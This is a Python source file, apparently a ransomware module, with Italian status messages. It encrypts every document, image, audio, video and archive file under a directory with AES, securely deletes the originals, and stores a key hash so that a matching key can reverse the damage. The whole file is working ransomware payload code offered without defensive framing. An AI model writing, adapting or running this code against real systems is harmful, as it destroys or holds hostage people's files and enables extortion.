import os
import random
import struct
import hashlib
from Crypto.Cipher import AES
from custom_crypt import pad16
from utils import secure_delete

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
	if not out_filename:
		out_filename = in_filename + '.enc'

	iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
	encryptor = AES.new(pad16(key), AES.MODE_CBC, iv)
	filesize = os.path.getsize(in_filename)

	with open(in_filename, 'rb') as infile:
		with open(out_filename, 'wb') as outfile:
			outfile.write(struct.pack('<Q', filesize))
			outfile.write(iv)

			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ' ' * (16 - len(chunk) % 16)

				outfile.write(encryptor.encrypt(chunk))



def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
	if not out_filename:
		out_filename = os.path.splitext(in_filename)[0]

	with open(in_filename, 'rb') as infile:
		origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
		iv = infile.read(16)
		decryptor = AES.new(pad16(key), AES.MODE_CBC, iv)

		with open(out_filename, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break
				outfile.write(decryptor.decrypt(chunk))

			outfile.truncate(origsize)



def ransom_files (key, path):

	doc_ext = ["pdf", "doc", "docx", "ppt", "pptx", "xls", "xlsx", "rtf", "txt"]
	img_ext = ["jpg", "jpeg", "gif", "png", "tiff", "bmp"]
	msc_ext = ["wav", "wave", "mp3", "3gp", "arm", "aac", "m4v", "wma", "webm", "ogg"]
	vid_ext = ["avi", "mp4", "flv", "mpeg", "mpg", "mov", "wmv",]
	arc_ext = ["zip", "7zp", "rar", "iso"]

	doc_f = []
	img_f = []
	msc_f = []
	vid_f = []
	arc_f = []

	for root, dirs, files in os.walk(path):
		for file in files:

			for ext in doc_ext:
				if file.endswith(ext):
					doc_f.append(os.path.join(root, file))

			for ext in img_ext:
				if file.endswith(ext):
					img_f.append(os.path.join(root, file))

			for ext in msc_ext:
				if file.endswith(ext):
					msc_f.append(os.path.join(root, file))

			for ext in vid_ext:
				if file.endswith(ext):
					vid_f.append(os.path.join(root, file))

			for ext in arc_ext:
				if file.endswith(ext):
					arc_f.append(os.path.join(root, file))

	f_group = doc_f + img_f + msc_f + vid_f + arc_f

	hash_object = hashlib.sha512(key)
	h = hash_object.hexdigest()

	with open(path + "master_key.encrypted0", 'w') as outfile:
		outfile.write(h)
		outfile.close()

	for f in f_group:
		encrypt_file (key, f, f + ".encrypted")
		secure_delete (f)

	f_stats = "[*] Files cifrati: " + str(len(f_group)) + " di cui:\n\tDocumenti:\t" + str(len(doc_f)) + "\n\tImmagini:\t" + str(len(img_f)) + "\n\tFiles musicali:\t" + str(len(msc_f)) + "\n\tVideo:\t\t" + str(len(vid_f)) + "\n\tFiles archivio:\t" + str(len(arc_f)) + "\n"
	f_stats += "\n[*] Chiave: " + key + "\n\n"
	return f_stats



def unransom_files (key, path):

	try:
		with open(path + "master_key.encrypted0", 'r') as outfile:
			hf = outfile.read ()
			outfile.close()

		hash_object = hashlib.sha512(key)
		h = hash_object.hexdigest()
	except:
		return "[*] Files decifrati: 0 (Nessuna master_key trovata)\n\n"

	if h == hf:

		targets =[]
		for root, dirs, files in os.walk(path):
			for file in files:
				if file.endswith("encrypted"):
					targets.append(os.path.join(root, file))

		for f in targets:
			decrypt_file (key, f)
			os.remove(f)

		os.remove(path + "master_key.encrypted0")
		f_stats = "[*] Files decifrati: " + str(len(targets)) + "\n\n"

		return f_stats

	else:
		return "[*] Files decifrati: 0 (Chiave non corretta)\n\n"



#print ransom_files ("test", "C:\\Users\\user\\Desktop\\test_ransome")
#print unransom_files ("test", "C:\\Users\\user\\Desktop\\test_ransome")
